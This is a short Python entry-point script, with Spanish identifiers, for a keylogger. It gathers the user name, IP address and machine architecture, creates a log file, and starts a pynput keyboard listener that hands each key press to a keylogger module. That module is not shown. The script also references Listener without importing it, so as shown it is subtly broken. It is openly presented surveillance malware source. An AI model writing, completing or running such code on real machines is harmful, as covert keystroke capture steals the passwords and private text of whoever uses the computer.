from datos_computador import *
from keylogger import *
import platform
import ctypes
import os
from pynput import keyboard

if __name__ == "__main__":
    DatosComputador.getIp()
    print("iniciando")
    print(DatosComputador.getNombreUsuario())
    print(DatosComputador.getIp())
    print(DatosComputador.getArquitectura())

    Keylogger.crearArchivo()
    with Listener(on_press = Keylogger.detectarTeclaPresionada) as Listener:
        Listener.join()